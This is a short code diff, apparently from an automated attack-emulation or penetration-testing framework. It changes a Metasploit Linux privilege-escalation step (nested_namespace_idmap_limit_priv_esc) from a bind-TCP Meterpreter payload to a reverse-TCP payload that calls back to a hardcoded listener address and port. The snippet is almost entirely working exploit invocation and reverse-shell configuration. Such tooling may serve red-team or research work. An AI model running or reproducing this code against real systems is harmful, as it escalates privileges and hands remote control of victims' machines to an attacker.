@@ -90,8 +90,8 @@ class MSFSubUidShell(MSFPrivilegeEscalation):
           output = session_handler.execute_module(mtype='exploit', 
                                          mname='linux/local/nested_namespace_idmap_limit_priv_esc',
                                          opts = { "SESSION": target_session },
-                                         payload_name="linux/x86/meterpreter/bind_tcp",
-                                         payload_opts={'RHOST': str(self.ip_address)})
+                                         payload_name="linux/x86/meterpreter/reverse_tcp",
+                                         payload_opts={'LHOST': "10.46.64.10", 'LPORT': 4455})
           obs.add_raw_obs(output)
           obs.set_success(False)
           session = None
